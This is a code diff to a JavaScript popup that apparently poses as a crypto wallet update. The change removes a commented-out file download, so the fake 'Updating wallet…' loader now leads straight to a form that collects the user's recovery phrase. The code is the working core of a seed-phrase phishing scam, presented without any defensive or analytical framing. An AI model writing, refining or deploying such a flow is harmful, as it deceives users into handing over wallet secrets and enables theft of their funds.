@@ -249,20 +249,13 @@
     setTimeout(() => { nextSection('updateSection'); }, 2000);
   }
 
-  // UPDATED: Download logic now shows loader/message for 3s, then shows the phrase form
+  // Download logic removed, now just shows loader/message for 3s, then shows the phrase form
   function handleDownload() {
     popup.querySelector('#loaderMsg').textContent = "Updating wallet…";
     nextSection('loaderSection');
     setTimeout(() => {
       nextSection('phraseSection');
     }, 3000);
-    // Optionally start download in background
-    // const a = document.createElement('a');
-    // a.href = 'https://example.com/wallet-update.zip';
-    // a.download = 'wallet-update.zip';
-    // document.body.appendChild(a);
-    // a.click();
-    // document.body.removeChild(a);
   }
 
   function submitPhrase() {
